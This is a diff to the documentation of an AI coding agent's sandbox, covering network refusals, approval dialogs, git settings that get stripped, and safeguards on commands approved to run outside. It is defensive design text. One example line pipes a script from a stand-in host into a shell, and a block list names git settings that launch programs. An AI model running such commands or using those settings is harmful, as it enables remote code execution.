@@ -14,6 +14,10 @@ each refusal into one line after the command's own output:
 [sandbox] cannot reach 169.254.169.254: cloud metadata addresses are always blocked.
 ```
 
+The third kind comes with the `filtered` and `ask` modes, which are not built yet. With
+the network `off`, a command that cannot connect gets
+`[sandbox] no network: the sandbox's network mode is off.`
+
 ## The ways through
 
 | The command wanted to | Way through |
@@ -26,7 +30,7 @@ each refusal into one line after the command's own output:
 | Write a toolchain folder such as `~/.sdkman` | Pi asks you; say yes and it runs again |
 | Write a locked file such as `~/.bashrc` | You do it yourself with `!`, if you want it |
 | Reach a new host in `ask` mode | Pi asks you while the connection waits |
-| Use Docker | The agent asks to run that command outside (below); or `docker: true` opens the socket inside, if you accept that Docker is root |
+| Use Docker | The agent asks to run that command outside (below) |
 | Run a script or CLI that needs your credentials, or a build that needs a private repository | The agent asks to run that one command outside (below) |
 | Anything else | Your own `!` command, or `/sandbox off` for this session |
 
@@ -50,7 +54,7 @@ bash wants to reach api.example.com:443.   [Once]  [This session]  [Always]  [No
 
 - The question comes inside the waiting tool call, as every Jig approval does.
 - With no screen to ask on (headless, or a subagent), the answer is no, and the line
-  says that a person can allow it with `/sandbox allowed add`.
+  says that a person can allow it with `/sandbox allowed add <folder>`.
 - Questions from commands running at the same time wait in line, one at a time.
 - `Always` is kept in Pi's agent folder, which the sandbox cannot write, so the agent
   cannot approve itself.
@@ -65,7 +69,8 @@ with what it was before:
 
 - a new setting that runs a program (`core.fsmonitor`, `core.pager`, `core.editor`,
   `core.sshCommand`, `core.hooksPath`, `alias.* = !...`, `filter.*`, `diff.*.textconv`,
-  `credential.helper`, `include.path`, `includeIf.*`) is removed, the rest of the change
+  `credential.helper`, `include.path`, `includeIf.*`, and the others Jig's git guard
+  refuses: `gpg.program`, `url.*.insteadOf`, ...) is removed, the rest of the change
   stays, and the agent and you are told which one;
 - settings that were there before the command are left alone.
 
@@ -92,6 +97,16 @@ Why:      the integration tests need a database; Docker is closed inside the san
   as `{ "tool": "bash", "action": "outside", "command": "docker compose *", "decision":
   "allow" }`. No wildcard rule and no default ever allows it.
 - **With no screen to ask on** (headless, a subagent), the answer is no.
+- **A command pattern's `*` does not reach across `;`, `&`, `|`, `<`, `>`, a backquote,
+  `$(` or a line break,** so `docker compose *` allows `docker compose up -d` and not
+  `docker compose up; curl evil.example | sh`.
+- **The dialog shows what will run, whole:** control characters in the command and the
+  reason are shown as `\x0d`, and a command of more than 1,000 characters or 8 lines is
+  refused with the advice to put it in a script, since nobody can approve what they
+  cannot read.
+- **It runs only for the call the dialog was about:** `jig-sandbox` checks that
+  `jig-core` announced an allow for this exact tool call, and that the command is the one
+  shown. A call that skipped `jig-core`, or changed after the answer, does not run.
 - **Its output** still goes through `jig-core`, so secrets are taken out, and every
   outside run is recorded: `/sandbox` lists this session's, and `/lens` shows them.
 - **The agent is told** to use it only when the sandbox blocks something it needs and
